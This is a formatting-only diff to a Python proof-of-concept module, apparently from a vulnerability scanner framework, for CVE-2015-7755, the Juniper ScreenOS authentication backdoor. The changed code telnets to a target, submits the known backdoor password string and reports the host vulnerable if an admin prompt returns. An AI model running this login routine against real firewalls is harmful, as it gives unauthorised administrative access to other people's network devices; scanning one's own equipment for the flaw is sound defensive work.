@@ -6,11 +6,12 @@ import urlparse
 import time
 import telnetlib
 
+
 class Vuln(ABVuln):
     vuln_id = 'Juniper_0001'  # 平台漏洞编号，留空
     name = 'Juniper ScreenOS认证后门'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-10-08'  # 漏洞公布时间
     desc = '''
         2015年12月18日Juniper网络发布声明（advisory）示，他们已经发现了ScreenOS中的未经授权的代码，ScreenOS软件管理Netscreen防火墙。
@@ -24,6 +25,7 @@ class Vuln(ABVuln):
     cve_id = 'CVE-2015-7755'  # cve编号
     product = 'Juniper'  # 漏洞应用名称
     product_version = '6.2.0r15到6.2.0r18和6.3.0r12到6.3.0r20'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8eab28d4-3a14-47d5-af45-09c6ad4577e7'
@@ -46,16 +48,16 @@ class Poc(ABPoc):
             password = '<<< %s(un=\'%s\') = %u'
             finish = '->'
             try:
-                t = telnetlib.Telnet(arg,port, timeout=time)
+                t = telnetlib.Telnet(arg, port, timeout=time)
                 t.write(user + '\n')
-                t.read_until('password: ')  
+                t.read_until('password: ')
                 t.write(password + '\n')
-                str1 =  t.read_until(finish)
+                str1 = t.read_until(finish)
                 t.write("?\n")
                 str = t.read_until(finish)
                 t.close()
                 if ('->' in str) and ('exec' in str):
-                    #security_hole(arg)
+                    # security_hole(arg)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -67,6 +69,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
